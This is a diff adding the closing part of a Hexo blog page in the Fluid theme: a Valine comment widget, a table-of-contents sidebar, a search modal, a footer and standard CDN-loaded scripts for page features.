+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"cffMsCRnQgVg41fT6r4UVhsn-gzGzoHsz","appKey":"7fJmz4elucAMMsKGIgyYKPjw","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
